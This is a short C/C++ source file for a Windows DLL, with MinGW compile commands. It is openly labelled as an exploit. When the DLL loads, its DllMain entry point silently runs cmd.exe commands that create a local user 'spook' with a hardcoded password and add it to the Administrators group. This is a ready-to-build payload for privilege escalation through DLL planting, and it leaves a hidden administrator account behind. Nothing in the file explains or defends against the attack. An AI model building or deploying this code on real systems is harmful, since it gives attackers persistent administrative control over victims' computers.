#include <windows.h>
#include <string>
#include <atlstr.h>  
 
// compile:
// "c:\MinGW\bin\mingw32-g++.exe" -Wall -DBUILD_DLL -O2 -c exec_dll.c -o exec_dll.o
// "c:\MinGW\bin\mingw32-g++.exe" -shared -Wl,--dll exec_dll.o -o exec_dll.dll

int Exploit()
{
    WinExec("cmd.exe /c net user spook Summer2021! /add",0);
    WinExec("cmd.exe /c net localgroup administrators spook /add", 0);
    return 0;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}